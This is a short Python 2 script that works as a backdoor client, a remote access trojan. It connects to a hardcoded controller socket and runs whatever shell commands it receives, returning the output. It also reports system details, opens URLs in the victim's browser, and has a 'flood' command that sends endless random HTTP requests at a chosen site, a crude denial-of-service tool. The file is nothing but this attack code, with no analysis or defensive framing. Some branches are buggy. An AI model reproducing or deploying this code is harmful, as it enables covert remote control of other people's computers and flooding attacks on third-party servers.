#!/usr/bin/python
import socket, os, sys, platform, webbrowser, random, string
s = socket.socket()
host = '127.0.0.1'
port = 6464
s.connect((host, port))
def command_line():
       while True:
               cmd = s.recv(8192)
               if cmd[:2] == 'cd':
                       os.chdir(str(cmd[3:]))
                       o = ' '
                       s.send(o)
               elif cmd == 'python':
                       while cmd != 'exit()':
                               cmd = s.recv(8192)
                       if cmd == 'exit()':
                               pass
                       else:
                               try:
                                       exec cmd
                               except:
                                       o = ' '
               elif cmd == 'info':
                       o = str(platform.uname())
                       s.send(o)
               elif cmd[:7] == 'browser':
                       webbrowser.open(cmd[8:])
                       s.send('True')
               elif cmd[:5] == 'flood':
                       url = cmd[6:]
                       url.replace('https://', '')
                       url.replace('http://', '')
                       s.send('[*] Flooding ' + url + ' ...')
                       chars = string.ascii_lowercase + string.digits + '.' + '/'
                       while True:
                               ln = random.randint(1, 16)
                               rs = random.sample(chars, ln)
                               rs = ''.join(rs)
                               fs = socket.socket()
                               fs.connect((url, 80))
                               fs.send('GET' + rs + 'HTTP/1.1\r\n\r\n')
                               o = fs.recv(8192)
                               fs.close()
                               s.send(o)
               elif cmd == 'quit':
                               s.close()
                               sys.exit(0)
               else:
                       o = os.popen(cmd).read()
                       s.send(o)

command_line()
